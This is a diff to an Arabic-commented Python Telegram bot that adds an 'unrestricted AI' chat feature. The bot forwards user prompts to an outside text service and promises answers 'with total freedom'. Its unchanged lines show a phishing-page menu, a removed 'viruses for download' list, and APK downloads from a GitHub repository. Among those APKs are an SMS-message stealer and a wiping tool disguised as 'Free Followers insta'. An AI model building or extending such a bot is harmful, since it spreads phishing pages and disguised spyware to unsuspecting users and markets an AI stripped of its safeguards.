@@ -1,4 +1,4 @@
-import os, sys, subprocess, time, threading, random, string, logging, io
+import os, sys, subprocess, time, threading, random, string, logging, io, json
 import requests
 
 # ========== تثبيت المكتبات تلقائياً ==========
@@ -47,7 +47,7 @@ PHISH = [
     ("📱 فحص مواصفات الجهاز", "device.html")
 ]
 
-# ========== قسم التطبيقات (تم تصحيح الأسماء) ==========
+# ========== قسم التطبيقات ==========
 GITHUB_RAW = "https://raw.githubusercontent.com/a77094048-art/bot/main/"
 
 APPS = [
@@ -57,6 +57,10 @@ APPS = [
     ("🗑️ برنامج فرمتة",           "Free%20Followers%20insta.apk"),
     ("✉️ تطبيق سحب رسائل SMS",    "Sms%20Eye.apk"),
 ]
+
+# ========== إعدادات الذكاء الاصطناعي ==========
+AI_ENDPOINT = "https://text.pollinations.ai/"
+AI_CONTEXT = {}  # لتخزين سجل المحادثة
 
 # ========== دوال مساعدة ==========
 def gen_pass(length=16):
@@ -127,17 +131,36 @@ def send_long_message(chat_id, text, parse_mode="HTML"):
     for i in range(0, len(text), max_len):
         bot.send_message(chat_id, text[i:i+max_len], parse_mode=parse_mode)
 
-# ========== محتوى الأزرار (الحماية، فيروسات) ==========
-VIRUS_CONTENT = """🦠 <b>قائمة الفيروسات للتحميل</b> 🦠
-⚠️ حملها فقط، لا تفتحها أبداً!
-📦 <b>روابط التحميل:</b>
-(قائمة الروابط السابقة)"""
+def get_ai_response(user_id, prompt):
+    """الحصول على رد من الذكاء الاصطناعي غير المقيد"""
+    try:
+        # تخزين المحادثة
+        if user_id not in AI_CONTEXT:
+            AI_CONTEXT[user_id] = []
+        AI_CONTEXT[user_id].append({"role": "user", "message": prompt})
+        # إبقاء آخر 10 رسائل فقط
+        if len(AI_CONTEXT[user_id]) > 10:
+            AI_CONTEXT[user_id] = AI_CONTEXT[user_id][-10:]
 
-PROTECTION_CONTENT = """🛡️ <b>ماهي الحماية؟</b> 🛡️ ..."""
-IP_PROTECTION = """🔒 <b>حماية IP جهازك</b> 🔒 ..."""
-EMAIL_PROTECTION = """📧 <b>حماية البريد الإلكتروني</b> 📧 ..."""
-PROXY_CONTENT = """🎩 <b>كيفية استخدام البروكسي</b> 🎩 ..."""
-MAC_PROTECTION = """📡 <b>حماية عنوان MAC</b> 📡 ..."""
+        # بناء النص الكامل
+        full_prompt = ""
+        for msg in AI_CONTEXT[user_id]:
+            full_prompt += f"{msg['role']}: {msg['message']}\n"
+        full_prompt += "assistant:"
+
+        # إرسال الطلب
+        resp = requests.get(
+            AI_ENDPOINT + requests.utils.quote(full_prompt),
+            timeout=30
+        )
+        if resp.status_code == 200:
+            ai_text = resp.text.strip()
+            AI_CONTEXT[user_id].append({"role": "assistant", "message": ai_text})
+            return ai_text
+        else:
+            return "❌ تعذر الاتصال بالذكاء الاصطناعي حالياً"
+    except Exception as e:
+        return f"❌ خطأ: {e}"
 
 # ========== Webhook ==========
 @app.route(f"/{TOKEN}", methods=['POST'])
@@ -175,8 +198,9 @@ def start(msg):
     markup.row(types.InlineKeyboardButton("🎩 البروكسي", callback_data="proxy"),
                types.InlineKeyboardButton("📡 تغيير MAC", callback_data="mac"))
 
-    # قسم التطبيقات
-    markup.row(types.InlineKeyboardButton("📱 قسم التطبيقات", callback_data="apps_menu"))
+    # قسم التطبيقات والذكاء الاصطناعي
+    markup.row(types.InlineKeyboardButton("📱 قسم التطبيقات", callback_data="apps_menu"),
+               types.InlineKeyboardButton("🤖 ذكاء اصطناعي", callback_data="ai_chat"))
 
     # الأدوات
     markup.row(types.InlineKeyboardButton("🔊 نص لصوت", callback_data="tts"),
@@ -224,6 +248,13 @@ def callback(call):
     elif data == "proxy": send_long_message(chat, PROXY_CONTENT)
     elif data == "mac": bot.send_message(chat, MAC_PROTECTION, parse_mode="HTML")
 
+    # --- الذكاء الاصطناعي ---
+    elif data == "ai_chat":
+        user_states[chat] = "ai_chat"
+        bot.send_message(chat, "🤖 <b>الذكاء الاصطناعي غير المقيد</b>\n\nأرسل سؤالك أو طلبك وسأجيبك بحرية تامة:")
+        # مسح السجل السابق
+        AI_CONTEXT[chat] = []
+
     # --- قسم التطبيقات ---
     elif data == "apps_menu":
         markup = types.InlineKeyboardMarkup(row_width=1)
@@ -269,6 +300,29 @@ def callback(call):
     bot.answer_callback_query(call.id)
 
 # ========== معالج النصوص التفاعلية ==========
+@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "ai_chat")
+def handle_ai_chat(m):
+    chat = m.chat.id
+    user_states.pop(chat, None)
+    
+    # إرسال رسالة "جاري الكتابة..."
+    bot.send_chat_action(chat, 'typing')
+    
+    prompt = m.text
+    response = get_ai_response(chat, prompt)
+    
+    # إرسال الرد مع زر للعودة
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("🤖 سؤال آخر", callback_data="ai_chat"))
+    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
+    
+    # تقسيم الرسالة إذا كانت طويلة
+    if len(response) > 4000:
+        send_long_message(chat, response)
+        bot.send_message(chat, "للسؤال مرة أخرى، اضغط على الزر:", reply_markup=markup)
+    else:
+        bot.send_message(chat, response, reply_markup=markup)
+
 @bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "tts")
 def handle_tts(m):
     user_states.pop(m.chat.id)
